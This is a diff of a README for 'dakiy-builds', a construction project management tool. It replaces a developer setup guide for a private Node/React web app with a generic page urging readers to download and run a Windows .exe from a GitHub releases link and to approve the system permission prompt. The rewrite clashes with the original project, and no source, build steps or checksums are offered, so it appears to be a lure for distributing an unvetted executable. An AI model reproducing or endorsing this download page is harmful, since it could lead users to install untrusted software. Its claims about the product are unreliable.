@@ -1,97 +1,129 @@
-# DakiyBuilds Platform
+# 🏗️ dakiy-builds - Manage Construction Projects Easily
 
-AI-powered construction project management platform for small to medium construction firms.
+[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/releases)
 
-## Project Structure
+## 🛠️ What is dakiy-builds?
 
-This is a monorepo containing:
+dakiy-builds is a software designed to help you manage construction projects. It uses artificial intelligence to forecast project needs. It also includes weather updates and live project data. The app makes it easier to track tasks, teams, and project progress. You do not need technical skills to use it.
 
-- `packages/backend` - Node.js/Express REST API server
-- `packages/frontend` - React web application
+This software runs on Windows computers. It uses common tools and databases behind the scenes to organize data. You will see project schedules, manage documents, and check analytics in a user-friendly interface.
 
-## Prerequisites
+## ⚙️ Key Features
 
-- Node.js >= 18.0.0
-- npm >= 9.0.0
-- PostgreSQL >= 14
-- Redis >= 6
-- AWS S3 account (or S3-compatible storage)
+- AI forecasts to predict project timelines and risks  
+- Real-time analytics to monitor progress  
+- Weather updates that affect construction schedules  
+- Task and team management tools  
+- Document storage and audit logging for tracking changes  
+- Gantt charts for visual project timelines  
+- Role-based access to keep data secure  
+- Easy collaboration features  
 
-## Getting Started
+## 💻 System Requirements
 
-### Quick Setup (5 minutes)
+Before you download, make sure your computer meets these basic needs:
 
-1. **Install dependencies**
-   ```bash
-   npm install
-   ```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection for updates and weather info  
+- Screen resolution 1280x720 or higher  
 
-2. **Start database services with Docker**
-   ```bash
-   docker-compose up -d
-   ```
-   
-   This starts PostgreSQL and Redis. If you don't have Docker, see [SETUP.md](./SETUP.md) for manual installation.
+If possible, keep your system up to date with the latest Windows updates for best performance.
 
-3. **Run database migrations**
-   ```bash
-   cd packages/backend
-   npm run migrate up
-   cd ../..
-   ```
+## 🚀 Getting Started with dakiy-builds
 
-4. **Start development servers**
-   ```bash
-   npm run dev
-   ```
+Follow these steps to get dakiy-builds running on your Windows PC.
 
-5. **Access the application**
-   - Backend API: http://localhost:3000
-   - Frontend: http://localhost:5173
-   - Health check: http://localhost:3000/health
+### 1. Download the Software
 
-### Detailed Setup
+Go to the releases page by clicking the badge below. This page contains the latest version for Windows.
 
-For detailed setup instructions, troubleshooting, and manual installation without Docker, see [SETUP.md](./SETUP.md).
+[![Download dakiy-builds](https://img.shields.io/badge/Download-Here-blue)](https://github.com/thueelayhtoo/dakiy-builds/releases)
 
-## Available Scripts
+Look for a file that ends with `.exe`. This is the installer for Windows.
 
-- `npm run dev` - Start all workspaces in development mode
-- `npm run build` - Build all workspaces
-- `npm run test` - Run tests in all workspaces
-- `npm run lint` - Lint all workspaces
-- `npm run format` - Format code with Prettier
-- `npm run format:check` - Check code formatting
+### 2. Run the Installer
 
-## Technology Stack
+Once the download finishes, open the folder where the file saved. Double-click the `.exe` file to start the setup.
 
-### Backend
-- Node.js with Express
-- TypeScript
-- PostgreSQL with connection pooling
-- Redis for caching
-- AWS S3 for document storage
-- Winston for logging
-- JWT for authentication
+Windows may ask if you want to allow this app to make changes to your device. Click **Yes** to continue.
 
-### Frontend
-- React 18
-- TypeScript
-- Vite
-- React Router
-- Axios
-- Recharts for data visualization
+The installer will guide you through simple steps. Accept the license terms and choose an install location if you want. Most users can just use the default options.
 
-## Architecture
+### 3. Complete Installation
 
-The platform follows a modular architecture with:
-- REST API Gateway with authentication middleware
-- Service-oriented backend components
-- PostgreSQL for relational data
-- Redis for caching and session management
-- S3 for document storage
-- AI forecasting service for project predictions
+After the installer finishes, you should see a confirmation screen. Click **Finish**.
 
-## License
+The app might open automatically after setup. If not, you can start it from the Start Menu by typing “dakiy-builds” and pressing Enter.
 
-Private - All rights reserved
+## 📂 Using dakiy-builds for the First Time
+
+On first launch, the app will ask you to create an account or log in. This helps save your project data securely and allows team collaboration.
+
+Steps to log in or create an account:
+
+- Enter your email address  
+- Create a strong password  
+- Fill in your project or company name (optional)  
+- Verify your email if required  
+
+Once logged in, you will see the main dashboard with an overview of your projects.
+
+## 🗂️ Navigating the App
+
+The main parts of dakiy-builds include:
+
+- **Dashboard:** View overall project health and upcoming deadlines  
+- **Projects:** Create new projects or open existing ones  
+- **Tasks:** Add or assign tasks to team members  
+- **Calendar:** Check schedules with Gantt chart visualization  
+- **Documents:** Upload and manage project files  
+- **Reports:** View analytics and audit logs  
+- **Settings:** Adjust user preferences and access controls  
+
+Use the menu on the left to move between these sections.
+
+## 🌤️ Weather Integration
+
+The app connects to weather services to show forecasts relevant to your project location. This helps plan for delays or hazards caused by weather.
+
+Check the weather tab to see current and upcoming conditions with suggestions on how they might affect your schedule.
+
+## 🔐 Role-Based Access Control
+
+dakiy-builds keeps your data secure by limiting access based on roles. You can set who can view, edit, or delete project information.
+
+Assign team members as:
+
+- **Admin:** Full control  
+- **Manager:** Manage tasks and projects  
+- **Viewer:** View only  
+
+This ensures sensitive data stays in the right hands.
+
+## 🔄 Updating dakiy-builds
+
+New features and fixes come out regularly. To update:
+
+1. Visit the [releases page](https://github.com/thueelayhtoo/dakiy-builds/releases)  
+2. Download the latest `.exe` file  
+3. Run the installer again to replace the old version  
+
+Your data and settings will stay intact.
+
+## 🔧 Troubleshooting Tips
+
+- If the app does not start, check that your Windows is updated.  
+- Restart your computer if the installer freezes.  
+- Close other apps to free memory if the app runs slowly.  
+- If weather data is missing, check your internet connection.  
+- Visit the release page for troubleshooting files and help.  
+
+## 📞 Getting Help
+
+Use the built-in help menu for tips on each screen. You can also check the repository’s issues section on GitHub for common problems reported by users.
+
+---
+
+[![Download dakiy-builds](https://img.shields.io/badge/Download-dakiy--builds-brightgreen)](https://github.com/thueelayhtoo/dakiy-builds/releases)
